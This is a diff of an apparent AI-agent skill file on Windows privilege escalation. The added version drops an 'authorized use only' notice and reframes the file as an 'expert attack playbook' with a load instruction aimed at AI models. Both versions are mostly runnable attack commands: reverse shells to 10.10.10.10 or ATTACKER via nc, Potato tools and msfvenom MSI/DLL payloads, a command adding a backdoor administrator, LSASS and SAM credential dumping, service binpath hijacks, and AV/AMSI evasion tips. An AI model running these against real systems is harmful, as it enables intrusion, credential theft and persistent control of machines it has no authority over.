@@ -1,502 +1,328 @@
 ---
 name: windows-privilege-escalation
-description: "Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements."
-risk: offensive
-source: community
-author: zebbern
-date_added: "2026-02-27"
+description: >-
+  Windows local privilege escalation playbook. Use when you have low-privilege shell access on Windows and need to escalate via token abuse, Potato exploits, service misconfigurations, DLL hijacking, UAC bypass, or registry autoruns.
 ---
 
-> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
+# SKILL: Windows Local Privilege Escalation — Expert Attack Playbook
 
-# Windows Privilege Escalation
+> **AI LOAD INSTRUCTION**: Expert Windows privesc techniques. Covers token manipulation, Potato family, service misconfigurations, DLL hijacking, AlwaysInstallElevated, scheduled task abuse, registry autoruns, and named pipe impersonation. Base models miss nuanced privilege prerequisites and OS-version-specific constraints.
 
-## Purpose
+## 0. RELATED ROUTING
 
-Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements. This skill covers system enumeration, credential harvesting, service exploitation, token impersonation, kernel exploits, and various misconfigurations that enable escalation from standard user to Administrator or SYSTEM privileges.
+Before going deep, consider loading:
 
-## Inputs / Prerequisites
+- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after escalation for pivoting to other hosts
+- [windows-av-evasion](../windows-av-evasion/SKILL.md) when AV/EDR blocks your privesc tools
+- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) when the host is domain-joined and you need AD-level escalation
+- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for domain privilege escalation via ACL misconfigurations
 
-- **Initial Access**: Shell or RDP access as standard user on Windows system
-- **Enumeration Tools**: WinPEAS, PowerUp, Seatbelt, or manual commands
-- **Exploit Binaries**: Pre-compiled exploits or ability to transfer tools
-- **Knowledge**: Understanding of Windows security model and privileges
-- **Authorization**: Written permission for penetration testing activities
+### Advanced Reference
 
-## Outputs / Deliverables
+Also load [TOKEN_POTATO_TRICKS.md](./TOKEN_POTATO_TRICKS.md) when you need:
+- Detailed Potato family comparison (JuicyPotato → GodPotato evolution)
+- OS-version-specific exploit selection
+- Required privileges and protocol details per variant
 
-- **Privilege Escalation Path**: Identified vector to higher privileges
-- **Credential Dump**: Harvested passwords, hashes, or tokens
-- **Elevated Shell**: Command execution as Administrator or SYSTEM
-- **Vulnerability Report**: Documentation of misconfigurations and exploits
-- **Remediation Recommendations**: Fixes for identified weaknesses
+Also load [UAC_BYPASS_METHODS.md](./UAC_BYPASS_METHODS.md) when you need:
+- UAC bypass technique matrix (fodhelper, eventvwr, sdclt, etc.)
+- Auto-elevate binary abuse
+- Mock trusted directory tricks
 
-## Core Workflow
+---
 
-### 1. System Enumeration
+## 1. ENUMERATION CHECKLIST
 
-#### Basic System Information
-```powershell
-# OS version and patches
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
-wmic qfe
+### System Context
 
-# Architecture
-wmic os get osarchitecture
-echo %PROCESSOR_ARCHITECTURE%
-
-# Environment variables
-set
-Get-ChildItem Env: | ft Key,Value
-
-# List drives
-wmic logicaldisk get caption,description,providername
+```cmd
+whoami /all                        & REM Current user, groups, privileges
+systeminfo                         & REM OS version, hotfixes, architecture
+hostname                           & REM Machine name
+net user %USERNAME%                & REM Group memberships
 ```
 
-#### User Enumeration
-```powershell
-# Current user
-whoami
-echo %USERNAME%
+### Token Privileges (Critical)
 
-# User privileges
+```cmd
 whoami /priv
-whoami /groups
-whoami /all
-
-# All users
-net user
-Get-LocalUser | ft Name,Enabled,LastLogon
-
-# User details
-net user administrator
-net user %USERNAME%
-
-# Local groups
-net localgroup
-net localgroup administrators
-Get-LocalGroupMember Administrators | ft Name,PrincipalSource
 ```
 
-#### Network Enumeration
+| Privilege | Escalation Path |
+|---|---|
+| `SeImpersonatePrivilege` | Potato family exploits (§2) |
+| `SeAssignPrimaryTokenPrivilege` | Token manipulation, Potato variants |
+| `SeDebugPrivilege` | Dump LSASS, inject into SYSTEM processes |
+| `SeBackupPrivilege` | Read any file (SAM/SYSTEM/NTDS.dit) |
+| `SeRestorePrivilege` | Write any file (DLL hijack, service binary) |
+| `SeTakeOwnershipPrivilege` | Take ownership of any object |
+| `SeLoadDriverPrivilege` | Load vulnerable kernel driver → kernel exploit |
+
+### Services & Scheduled Tasks
+
+```cmd
+sc query state= all                & REM All services
+wmic service get name,displayname,pathname,startmode | findstr /i "auto"
+schtasks /query /fo LIST /v        & REM Verbose scheduled task list
+```
+
+### Installed Software & Patches
+
+```cmd
+wmic product get name,version
+wmic qfe list                      & REM Installed patches
+```
+
+### Network & Credentials
+
+```cmd
+netstat -ano                       & REM Listening ports + PIDs
+cmdkey /list                       & REM Stored credentials
+dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
+```
+
+---
+
+## 2. TOKEN MANIPULATION & POTATO EXPLOITS
+
+### SeImpersonatePrivilege Abuse
+
+Service accounts (IIS AppPool, MSSQL, etc.) typically hold `SeImpersonatePrivilege`. This enables impersonation of any token presented to you.
+
+| Tool | OS Support | Protocol | Notes |
+|---|---|---|---|
+| **JuicyPotato** | Win7–Server2016 | COM/DCOM | Requires valid CLSID; patched on Server2019+ |
+| **RoguePotato** | Server2019+ | OXID resolver redirect | Needs controlled machine on port 135 |
+| **PrintSpoofer** | Win10/Server2016-2019 | Named pipe via Print Spooler | Simple, fast; Spooler must run |
+| **SweetPotato** | Broad | COM + Print + EFS | Combines multiple techniques |
+| **GodPotato** | Win8–Server2022 | DCOM RPCSS | Works on latest patched systems |
+
+```cmd
+# PrintSpoofer (simplest for modern systems)
+PrintSpoofer64.exe -i -c "cmd /c whoami"
+
+# GodPotato (broadest compatibility)
+GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"
+
+# JuicyPotato (legacy systems)
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}
+```
+
+### SeDebugPrivilege Abuse
+
 ```powershell
-# Network interfaces
-ipconfig /all
-Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+# Dump LSASS (if SeDebugPrivilege is enabled)
+procdump -ma lsass.exe lsass.dmp
 
-# Routing table
-route print
-Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric
-
-# ARP table
-arp -A
-
-# Active connections
-netstat -ano
-
-# Network shares
-net share
-
-# Domain Controllers
-nltest /DCLIST:DomainName
+# Or migrate into a SYSTEM process
+# Meterpreter: migrate to winlogon.exe / services.exe
 ```
 
-#### Antivirus Enumeration
-```powershell
-# Check AV products
-WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
+---
+
+## 3. SERVICE MISCONFIGURATIONS
+
+### Unquoted Service Paths
+
+```cmd
+# Find unquoted paths with spaces
+wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
 ```
 
-### 2. Credential Harvesting
+If path is `C:\Program Files\My App\service.exe`, Windows tries:
+1. `C:\Program.exe`
+2. `C:\Program Files\My.exe`
+3. `C:\Program Files\My App\service.exe`
 
-#### SAM and SYSTEM Files
-```powershell
-# SAM file locations
-%SYSTEMROOT%\repair\SAM
-%SYSTEMROOT%\System32\config\RegBack\SAM
-%SYSTEMROOT%\System32\config\SAM
+Place malicious binary at first writable location.
 
-# SYSTEM file locations
-%SYSTEMROOT%\repair\system
-%SYSTEMROOT%\System32\config\SYSTEM
-%SYSTEMROOT%\System32\config\RegBack\system
+### Weak Service Permissions
 
-# Extract hashes (from Linux after obtaining files)
-pwdump SYSTEM SAM > sam.txt
-samdump2 SYSTEM SAM -o sam.txt
-
-# Crack with John
-john --format=NT sam.txt
+```cmd
+# Check service ACL with accesschk (Sysinternals)
+accesschk64.exe -wuvc * /accepteula
+# Look for: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
 ```
 
-#### HiveNightmare (CVE-2021-36934)
-```powershell
-# Check vulnerability
-icacls C:\Windows\System32\config\SAM
-# Vulnerable if: BUILTIN\Users:(I)(RX)
-
-# Exploit with mimikatz
-mimikatz> token::whoami /full
-mimikatz> misc::shadowcopies
-mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+```cmd
+# Reconfigure service to run attacker binary
+sc config vuln_svc binpath= "C:\temp\rev.exe"
+sc stop vuln_svc
+sc start vuln_svc
 ```
 
-#### Search for Passwords
-```powershell
-# Search file contents
-findstr /SI /M "password" *.xml *.ini *.txt
-findstr /si password *.xml *.ini *.txt *.config
+### Writable Service Binaries
 
-# Search registry
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-
-# Windows Autologin credentials
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
-
-# PuTTY sessions
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
-
-# VNC passwords
-reg query "HKCU\Software\ORL\WinVNC3\Password"
-reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
-
-# Search for specific files
-dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
-where /R C:\ *.ini
+```cmd
+# Check if current user can write to the service binary path
+icacls "C:\Program Files\VulnApp\service.exe"
+# (F) = Full, (M) = Modify, (W) = Write → replace binary
 ```
 
-#### Unattend.xml Credentials
-```powershell
-# Common locations
-C:\unattend.xml
-C:\Windows\Panther\Unattend.xml
-C:\Windows\Panther\Unattend\Unattend.xml
-C:\Windows\system32\sysprep.inf
-C:\Windows\system32\sysprep\sysprep.xml
+---
 
-# Search for files
-dir /s *sysprep.inf *sysprep.xml *unattend.xml 2>nul
+## 4. DLL HIJACKING
 
-# Decode base64 password (Linux)
-echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d
-```
+### DLL Search Order (Standard)
 
-#### WiFi Passwords
-```powershell
-# List profiles
-netsh wlan show profile
+1. Directory of the executable
+2. `C:\Windows\System32`
+3. `C:\Windows\System`
+4. `C:\Windows`
+5. Current directory
+6. Directories in `%PATH%`
 
-# Get cleartext password
-netsh wlan show profile <SSID> key=clear
+### Exploitation
 
-# Extract all WiFi passwords
-for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Key" | find /v "Number" & echo.) & @echo on
-```
-
-#### PowerShell History
-```powershell
-# View PowerShell history
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-cat (Get-PSReadlineOption).HistorySavePath
-cat (Get-PSReadlineOption).HistorySavePath | sls passw
-```
-
-### 3. Service Exploitation
-
-#### Incorrect Service Permissions
-```powershell
-# Find misconfigured services
-accesschk.exe -uwcqv "Authenticated Users" * /accepteula
-accesschk.exe -uwcqv "Everyone" * /accepteula
-accesschk.exe -ucqv <service_name>
-
-# Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG
-
-# Exploit vulnerable service
-sc config <service> binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444"
-sc stop <service>
-sc start <service>
-```
-
-#### Unquoted Service Paths
-```powershell
-# Find unquoted paths
-wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
-wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
-
-# Exploit: Place malicious exe in path
-# For path: C:\Program Files\Some App\service.exe
-# Try: C:\Program.exe or C:\Program Files\Some.exe
-```
-
-#### AlwaysInstallElevated
-```powershell
-# Check if enabled
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-
-# Both must return 0x1 for vulnerability
-
-# Create malicious MSI
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi
-
-# Install (runs as SYSTEM)
-msiexec /quiet /qn /i C:\evil.msi
-```
-
-### 4. Token Impersonation
-
-#### Check Impersonation Privileges
-```powershell
-# Look for these privileges
-whoami /priv
-
-# Exploitable privileges:
-# SeImpersonatePrivilege
-# SeAssignPrimaryTokenPrivilege
-# SeTcbPrivilege
-# SeBackupPrivilege
-# SeRestorePrivilege
-# SeCreateTokenPrivilege
-# SeLoadDriverPrivilege
-# SeTakeOwnershipPrivilege
-# SeDebugPrivilege
-```
-
-#### Potato Attacks
-```powershell
-# JuicyPotato (Windows Server 2019 and below)
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *
-
-# PrintSpoofer (Windows 10 and Server 2019)
-PrintSpoofer.exe -i -c cmd
-
-# RoguePotato
-RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999
-
-# GodPotato
-GodPotato.exe -cmd "cmd /c whoami"
-```
-
-### 5. Kernel Exploitation
-
-#### Find Kernel Vulnerabilities
-```powershell
-# Use Windows Exploit Suggester
-systeminfo > systeminfo.txt
-python wes.py systeminfo.txt
-
-# Or use Watson (on target)
-Watson.exe
-
-# Or use Sherlock PowerShell script
-powershell.exe -ExecutionPolicy Bypass -File Sherlock.ps1
-```
-
-#### Common Kernel Exploits
-```
-MS17-010 (EternalBlue) - Windows 7/2008/2003/XP
-MS16-032 - Secondary Logon Handle - 2008/7/8/10/2012
-MS15-051 - Client Copy Image - 2003/2008/7
-MS14-058 - TrackPopupMenu - 2003/2008/7/8.1
-MS11-080 - afd.sys - XP/2003
-MS10-015 - KiTrap0D - 2003/XP/2000
-MS08-067 - NetAPI - 2000/XP/2003
-CVE-2021-1732 - Win32k - Windows 10/Server 2019
-CVE-2020-0796 - SMBGhost - Windows 10
-CVE-2019-1388 - UAC Bypass - Windows 7/8/10/2008/2012/2016/2019
-```
-
-### 6. Additional Techniques
-
-#### DLL Hijacking
-```powershell
-# Find missing DLLs with Process Monitor
-# Filter: Result = NAME NOT FOUND, Path ends with .dll
+```cmd
+# Find missing DLLs (use Process Monitor)
+# Filter: Result=NAME NOT FOUND, Path ends with .dll
 
 # Compile malicious DLL
-# For x64: x86_64-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
-# For x86: i686-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll > evil.dll
+
+# Place in writable directory that comes before the real DLL location
 ```
 
-#### Runas with Saved Credentials
-```powershell
-# List saved credentials
-cmdkey /list
+### Known Phantom DLL Targets
 
-# Use saved credentials
-runas /savecred /user:Administrator "cmd.exe /k whoami"
-runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe"
-```
+| Application | Missing DLL | Drop Location |
+|---|---|---|
+| Various .NET apps | `profapi.dll` | Application directory |
+| Windows services | `wlbsctrl.dll` | `%PATH%` writable dir |
+| Third-party updaters | `VERSION.dll` | Application directory |
 
-#### WSL Exploitation
-```powershell
-# Check for WSL
-wsl whoami
+---
 
-# Set root as default user
-wsl --default-user root
-# Or: ubuntu.exe config --default-user root
+## 5. ALWAYSINSTALLELEVATED
 
-# Spawn shell as root
-wsl whoami
-wsl python -c 'import os; os.system("/bin/bash")'
-```
-
-## Quick Reference
-
-### Enumeration Tools
-
-| Tool | Command | Purpose |
-|------|---------|---------|
-| WinPEAS | `winPEAS.exe` | Comprehensive enumeration |
-| PowerUp | `Invoke-AllChecks` | Service/path vulnerabilities |
-| Seatbelt | `Seatbelt.exe -group=all` | Security audit checks |
-| Watson | `Watson.exe` | Missing patches |
-| JAWS | `.\jaws-enum.ps1` | Legacy Windows enum |
-| PrivescCheck | `Invoke-PrivescCheck` | Privilege escalation checks |
-
-### Default Writable Folders
-
-```
-C:\Windows\Temp
-C:\Windows\Tasks
-C:\Users\Public
-C:\Windows\tracing
-C:\Windows\System32\spool\drivers\color
-C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
-```
-
-### Common Privilege Escalation Vectors
-
-| Vector | Check Command |
-|--------|---------------|
-| Unquoted paths | `wmic service get pathname \| findstr /i /v """` |
-| Weak service perms | `accesschk.exe -uwcqv "Everyone" *` |
-| AlwaysInstallElevated | `reg query HKCU\...\Installer /v AlwaysInstallElevated` |
-| Stored credentials | `cmdkey /list` |
-| Token privileges | `whoami /priv` |
-| Scheduled tasks | `schtasks /query /fo LIST /v` |
-
-### Impersonation Privilege Exploits
-
-| Privilege | Tool | Usage |
-|-----------|------|-------|
-| SeImpersonatePrivilege | JuicyPotato | CLSID abuse |
-| SeImpersonatePrivilege | PrintSpoofer | Spooler service |
-| SeImpersonatePrivilege | RoguePotato | OXID resolver |
-| SeBackupPrivilege | robocopy /b | Read protected files |
-| SeRestorePrivilege | Enable-SeRestorePrivilege | Write protected files |
-| SeTakeOwnershipPrivilege | takeown.exe | Take file ownership |
-
-## Constraints and Limitations
-
-### Operational Boundaries
-- Kernel exploits may cause system instability
-- Some exploits require specific Windows versions
-- AV/EDR may detect and block common tools
-- Token impersonation requires service account context
-- Some techniques require GUI access
-
-### Detection Considerations
-- Credential dumping triggers security alerts
-- Service modification logged in Event Logs
-- PowerShell execution may be monitored
-- Known exploit signatures detected by AV
-
-### Legal Requirements
-- Only test systems with written authorization
-- Document all escalation attempts
-- Avoid disrupting production systems
-- Report all findings through proper channels
-
-## Examples
-
-### Example 1: Service Binary Path Exploitation
-```powershell
-# Find vulnerable service
-accesschk.exe -uwcqv "Authenticated Users" * /accepteula
-# Result: RW MyService SERVICE_ALL_ACCESS
-
-# Check current config
-sc qc MyService
-
-# Stop service and change binary path
-sc stop MyService
-sc config MyService binpath= "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
-sc start MyService
-
-# Catch shell as SYSTEM
-```
-
-### Example 2: AlwaysInstallElevated Exploitation
-```powershell
-# Verify vulnerability
+```cmd
+# Check both registry keys — BOTH must be set to 1
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-# Both return: 0x1
-
-# Generate payload (attacker machine)
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi
-
-# Transfer and execute
-msiexec /quiet /qn /i C:\Users\Public\shell.msi
-
-# Catch SYSTEM shell
 ```
 
-### Example 3: JuicyPotato Token Impersonation
+```cmd
+# Generate MSI payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > evil.msi
+msiexec /quiet /qn /i evil.msi
+```
+
+---
+
+## 6. SCHEDULED TASK ABUSE
+
+```cmd
+# Enumerate tasks with writable scripts or missing binaries
+schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Schedule Type"
+
+# Check permissions on task binary
+icacls "C:\path\to\task\binary.exe"
+
+# If writable: replace binary, wait for task execution
+# If missing: place your binary at the expected path
+```
+
+### Scheduled Task via PowerShell
+
 ```powershell
-# Verify SeImpersonatePrivilege
-whoami /priv
-# SeImpersonatePrivilege Enabled
-
-# Run JuicyPotato
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
-
-# Catch SYSTEM shell
+# If you can create tasks (unlikely from low priv, useful post-UAC-bypass)
+$action = New-ScheduledTaskAction -Execute "C:\temp\rev.exe"
+$trigger = New-ScheduledTaskTrigger -AtLogon
+Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger -User "SYSTEM"
 ```
 
-### Example 4: Unquoted Service Path
+---
+
+## 7. REGISTRY AUTORUNS
+
+```cmd
+# Check writable autorun locations
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+
+# Check permissions with accesschk
+accesschk64.exe -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /accepteula
+```
+
+If an autorun entry points to a writable path → replace binary or inject new entry.
+
+---
+
+## 8. NAMED PIPE IMPERSONATION
+
 ```powershell
-# Find unquoted path
-wmic service get name,pathname | findstr /i /v """
-# Result: C:\Program Files\Vuln App\service.exe
+# Service account creates a named pipe, tricks a SYSTEM process into connecting
+# The connecting client's token is then impersonated
 
-# Check write permissions
-icacls "C:\Program Files\Vuln App"
-# Result: Users:(W)
-
-# Place malicious binary
-copy C:\Users\Public\shell.exe "C:\Program Files\Vuln.exe"
-
-# Restart service
-sc stop "Vuln App"
-sc start "Vuln App"
+# PrintSpoofer leverages this with the Print Spooler:
+PrintSpoofer64.exe -i -c powershell.exe
 ```
 
-### Example 5: Credential Harvesting from Registry
+Custom named pipe server (requires SeImpersonatePrivilege):
 ```powershell
-# Check for auto-logon credentials
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
-# DefaultUserName: Administrator
-# DefaultPassword: P@ssw0rd123
-
-# Use credentials
-runas /user:Administrator cmd.exe
-# Or for remote: psexec \\target -u Administrator -p P@ssw0rd123 cmd
+# Create pipe → coerce SYSTEM connection → ImpersonateNamedPipeClient() → SYSTEM token
 ```
 
-## Troubleshooting
+---
 
-| Issue | Cause | Solution |
-|-------|-------|----------|
-| Exploit fails (AV detected) | AV blocking known exploits | Use obfuscated exploits; living-off-the-land (mshta, certutil); custom compiled binaries |
-| Service won't start | Binary path syntax | Ensure space after `=` in binpath: `binpath= "C:\path\binary.exe"` |
-| Token impersonation fails | Wrong privilege/version | Check `whoami /priv`; verify Windows version compatibility |
-| Can't find kernel exploit | System patched | Run Windows Exploit Suggester: `python wes.py systeminfo.txt` |
-| PowerShell blocked | Execution policy/AMSI | Use `powershell -ep bypass -c "cmd"` or `-enc <base64>` |
+## 9. AUTOMATED TOOLS
 
-## When to Use
-This skill is applicable to execute the workflow or actions described in the overview.
+| Tool | Purpose | Command |
+|---|---|---|
+| **winPEAS** | Comprehensive Windows enumeration | `winPEASx64.exe` |
+| **PowerUp** | Service/DLL/registry misconfig checks | `Invoke-AllChecks` |
+| **Seatbelt** | Security-focused host survey | `Seatbelt.exe -group=all` |
+| **SharpUp** | C# port of PowerUp checks | `SharpUp.exe audit` |
+| **PrivescCheck** | PowerShell privesc checker | `Invoke-PrivescCheck` |
+| **BeRoot** | Common misconfig finder | `beRoot.exe` |
+
+---
+
+## 10. PRIVILEGE ESCALATION DECISION TREE
+
+```
+Low-privilege shell on Windows
+│
+├── whoami /priv → SeImpersonatePrivilege?
+│   ├── Yes → Potato family (§2)
+│   │   ├── Server2019+/Win11 → GodPotato or PrintSpoofer
+│   │   ├── Server2016/Win10 → PrintSpoofer or SweetPotato
+│   │   └── Older → JuicyPotato (need CLSID)
+│   └── SeDebugPrivilege? → LSASS dump / process injection
+│
+├── Service misconfigurations?
+│   ├── Unquoted path with spaces + writable dir? → binary plant (§3)
+│   ├── SERVICE_CHANGE_CONFIG on service? → reconfigure binpath (§3)
+│   └── Writable service binary? → replace executable (§3)
+│
+├── DLL hijacking opportunity?
+│   ├── Missing DLL in search path? → plant malicious DLL (§4)
+│   └── Writable directory in %PATH%? → DLL plant (§4)
+│
+├── AlwaysInstallElevated set?
+│   └── Both HKLM+HKCU = 1 → MSI payload (§5)
+│
+├── Scheduled task abuse?
+│   ├── Task runs as SYSTEM with writable binary? → replace (§6)
+│   └── Task references missing binary? → plant binary (§6)
+│
+├── Registry autorun writable?
+│   └── Writable binary path → replace on next login/reboot (§7)
+│
+├── UAC bypass needed? (medium integrity → high integrity)
+│   └── Load UAC_BYPASS_METHODS.md
+│
+├── Stored credentials?
+│   ├── cmdkey /list → runas /savecred
+│   ├── Autologon in registry? → plaintext creds
+│   └── WiFi passwords, browser creds, DPAPI
+│
+└── None of the above?
+    ├── Run winPEAS for comprehensive scan
+    ├── Check internal services (netstat -ano)
+    ├── Look for sensitive files (unattend.xml, web.config, *.config)
+    └── Check for kernel exploits (systeminfo → Windows Exploit Suggester)
+```
